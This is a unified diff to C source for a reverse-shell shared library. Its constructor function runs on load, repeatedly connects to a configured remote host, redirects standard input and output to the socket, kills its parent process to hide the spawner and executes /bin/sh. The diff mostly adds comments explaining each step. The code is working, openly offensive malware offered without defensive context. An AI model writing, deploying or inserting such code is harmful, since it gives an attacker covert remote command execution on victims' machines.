@@ -12,26 +12,27 @@ void __attribute__((constructor)) reverse_shell(){
   int connection = -1;
   int pid;
   struct sockaddr_in server;  
-  
+
+  // set up socket for connection
   socket_fd = socket(AF_INET, SOCK_STREAM, 0);
   server.sin_family = AF_INET;
   server.sin_port = htons(port);
   server.sin_addr.s_addr = inet_addr(addr);
-    
+
+  // loop until connection is established
   while(connection < 0){
     sleep(5);
     connection = connect(socket_fd, (struct sockaddr *)&server, sizeof(struct sockaddr));
   }
-    
+
+  // fork process && copy stdin, stdout & stderr to client socket
   if((pid = fork()) == 0){
     dup2(socket_fd,0);
     dup2(socket_fd,1);
     dup2(socket_fd,2);
-    kill(getppid(), SIGKILL);
-    execve("/bin/sh", NULL, NULL);
+    kill(getppid(), SIGKILL); // kill parent process to hide who spawned shell 
+    execve("/bin/sh", NULL, NULL); // start shell
   }else{
     wait(NULL);
-    close(socket_fd);
-    exit(0);
   }
 }
